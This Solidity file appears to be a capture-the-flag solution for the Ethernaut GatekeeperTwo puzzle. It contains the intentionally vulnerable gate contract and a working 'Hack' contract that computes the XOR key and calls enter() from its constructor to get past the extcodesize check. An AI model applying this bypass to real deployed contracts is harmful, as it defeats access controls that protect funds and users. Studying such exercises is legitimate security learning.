// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contract Hack {
//     constructor(GatekeeperTwo gatekeeperTwo) {
//     uint64 s = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
//     uint64 k = s ^ type(uint64).max;

//     bytes8 key = bytes8(k);
//     require(gatekeeperTwo.enter(key), "failed");
//     }
// }
contract Hack {
    constructor(GatekeeperTwo gatekeeperTwo) {
        // Generate the key
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;
        bytes8 key = bytes8(k);

        // Call the enter function during the constructor
        require(gatekeeperTwo.enter(key), "failed");
    }
}
contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}